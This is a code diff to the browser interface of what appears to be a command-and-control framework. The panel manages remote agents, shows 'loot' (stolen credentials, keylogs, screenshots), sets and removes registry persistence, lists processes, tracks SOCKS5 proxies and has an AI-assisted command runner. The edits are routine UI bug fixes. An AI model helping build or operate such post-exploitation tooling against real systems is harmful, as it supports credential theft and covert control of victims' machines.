@@ -1406,10 +1406,10 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
     <!-- ── Loot ── -->
     <div class="tab-panel" id="tab-loot">
       <div class="sub-tabs">
-        <div class="sub-tab active" onclick="showSubTab('loot','creds')">Credentials</div>
-        <div class="sub-tab" onclick="showSubTab('loot','keylog')">Keylog</div>
-        <div class="sub-tab" onclick="showSubTab('loot','screenshots')">Screenshots</div>
-        <div class="sub-tab" onclick="showSubTab('loot','downloads')">Downloads</div>
+        <div class="sub-tab active" onclick="showSubTab(event,'loot','creds')">Credentials</div>
+        <div class="sub-tab" onclick="showSubTab(event,'loot','keylog')">Keylog</div>
+        <div class="sub-tab" onclick="showSubTab(event,'loot','screenshots')">Screenshots</div>
+        <div class="sub-tab" onclick="showSubTab(event,'loot','downloads')">Downloads</div>
       </div>
       <div id="loot-panel">
         <!-- Credentials -->
@@ -3659,7 +3659,7 @@ async function runCtxAction(act) {
       const aid = act.id || activeAgent?.id;
       if (!aid) break;
       showPrompt('Remove Persistence', 'Task / key name to remove (blank = default)', '', name => {
-        api('POST', `/api/agents/${aid}/task`, {type:'PERSIST_RM', args: name.trim()})
+        api('POST', `/api/agents/${aid}/task`, {type:'PERSIST_RM', args: JSON.stringify({name: name.trim() || 'Updater', method:'registry'})})
           .then(r => { if (r?.ok) toast(`PERSIST_RM: ${name.trim()||'(default)'}`); });
       });
       break;
@@ -4159,6 +4159,11 @@ function closePSSession(agentId, e) {
     document.getElementById('ps-view').style.display = 'none';
     document.getElementById('console-view').style.display = 'flex';
   }
+  if (consoleTabs.length === 0 && fxSessions.size === 0 && psSessions.size === 0) {
+    document.getElementById('console-pane').classList.remove('open');
+    document.getElementById('console-prompt-label').textContent = 'c2 »';
+    fxShowView('console');
+  }
   renderConsoleTabs();
 }
 
@@ -4167,10 +4172,7 @@ async function refreshProcessList() {
   const wrap = document.getElementById('ps-table-wrap');
   wrap.innerHTML = '<div style="padding:20px;color:var(--text3);font-family:var(--font-mono)">Waiting for agent…</div>';
   try {
-    const resp = await fetch(`/browse/ps?agent=${psAgentId}&timeout=300`, {
-      headers: {'Authorization': 'Bearer ' + (TOKEN || window.__GUI_TOKEN__)}
-    });
-    const data = await resp.json();
+    const data = await api('GET', `/browse/ps?agent=${psAgentId}&timeout=300`);
     if (data.error) {
       wrap.innerHTML = `<div style="padding:20px;color:var(--red)">${esc(data.error)}</div>`;
       return;
@@ -4733,8 +4735,7 @@ window.onload = () => {
     document.getElementById('login-url').value   = window.location.origin;
     document.getElementById('login-token').value = window.__GUI_TOKEN__ || '';
   }
-  // Auto-login when the GUI token is embedded (local GUI mode)
-  if (window.__GUI_TOKEN__ && !TOKEN) { setTimeout(doLogin, 100); }
+  // Token is pre-filled; user clicks Connect to authenticate explicitly
 
   // Global drag/pan listeners for agent graph
   document.addEventListener('mousemove', e => {
@@ -4889,13 +4890,14 @@ function doLogout() {
   _appIntervals.forEach(id => clearInterval(id));
   _appIntervals = [];
   localStorage.removeItem('c2_session');
+  const prevBase = BASE;
   BASE = ''; TOKEN = ''; OPERATOR = '';
   document.getElementById('op-name').textContent = 'operator: gui';
   document.getElementById('conn-dot').style.background = '';
   document.getElementById('conn-text').textContent = 'Disconnected';
-  const overlay = document.getElementById('modal-login');
-  overlay.style.display = '';
-  overlay.classList.add('open');
+  document.getElementById('login-url').value   = prevBase || window.location.origin;
+  document.getElementById('login-token').value = window.__GUI_TOKEN__ || '';
+  openModal('modal-login');
 }
 
 // ── App Init ──────────────────────────────────────────────────────────────────
@@ -5085,10 +5087,10 @@ function showTab(name) {
   if (name === 'ai')        { aiLoadModels(); setTimeout(() => document.getElementById('ai-input')?.focus(), 50); }
 }
 
-function showSubTab(group, name) {
+function showSubTab(evt, group, name) {
   document.querySelectorAll(`#tab-${group} .sub-tab`).forEach(t => t.classList.remove('active'));
   document.querySelectorAll(`#tab-${group} .sub-panel`).forEach(p => p.classList.remove('active'));
-  event.target.classList.add('active');
+  evt.target.classList.add('active');
   document.getElementById(`sub-${group}-${name}`)?.classList.add('active');
   if (group === 'loot' && name === 'screenshots') loadScreenshots();
 }
@@ -7123,7 +7125,7 @@ function renderConsoleTabs() {
       : (activeAgent && activeAgent.id === id && !fxAgentId && !aicAgentId);
 
     const dotColor = isAI ? 'var(--accent)' : (!a ? '#666' :
-      (Date.now()/1000 - (a.last_seen||0) < a.sleep_sec*2+60) ? 'var(--green)' : 'var(--red)');
+      (Date.now()/1000 - (a.last_seen ? new Date(a.last_seen).getTime()/1000 : 0) < a.sleep_sec*2+60) ? 'var(--green)' : 'var(--red)');
 
     const tab = document.createElement('div');
     tab.className = 'console-tab' + (isActive ? ' active' : '');
@@ -7196,10 +7198,11 @@ function closeConsoleTab(id, e) {
     fxShowView('console');
   } else if (consoleTabs.length > 0) {
     switchConsoleTab(consoleTabs[consoleTabs.length - 1]);
-  } else {
-    // Only FX sessions remain — switch to first one
+  } else if (fxSessions.size > 0) {
+    // FX sessions remain — switch to first one
     fxSwitchSession([...fxSessions.keys()][0]);
   }
+  // else: only PS sessions remain; their view is already visible
   renderConsoleTabs();
 }
 
@@ -13276,6 +13279,7 @@ function fxShowView(mode) {
 }
 
 function fxSwitchSession(agentId) {
+  if (!agentId) return;
   fxSaveSession();
   fxAgentId = agentId;
   const s = fxSessions.get(agentId);
@@ -15912,7 +15916,8 @@ function aicMarkdown(text) {
   html = html.replace(/\*\*([^*]+)\*\*/g, (_, t) => '<strong>' + esc(t) + '</strong>');
   html = html.replace(/^#{1,3} (.+)$/gm, (_, t) => '<strong>' + esc(t) + '</strong>');
   html = html.replace(/^[-*] (.+)$/gm, (_, t) => '<li>' + esc(t) + '</li>');
-  html = html.replace(/(<li>.*<\/li>)/, '<ul>$1</ul>');
+  html = html.replace(/(<li>.*<\/li>)/g, '<ul>$1</ul>');
+  html = html.replace(/<\/ul>\n<ul>/g, '');
   html = html.replace(/\n\n/g, '<br><br>').replace(/\n/g, '<br>');
   return html;
 }
@@ -16170,6 +16175,8 @@ async function aicExecuteCmd(idx) {
 
     // Trigger AI analysis
     await _aicAutoAnalyze();
+    btn.disabled = false;
+    btn.textContent = '▶ Run';
 
   } catch(e) {
     resultBox.textContent = '✗ Error: ' + e.message;
@@ -16272,7 +16279,7 @@ function socks5List() {
   if (active.length === 0) {
     toast('No hay proxies SOCKS5 activos registrados en esta sesión', 'warn');
   } else {
-    alert('SOCKS5 activos:\n\n' + active.join('\n'));
+    active.forEach(line => toast('SOCKS5: ' + line, 'blue'));
   }
 }
 </script>
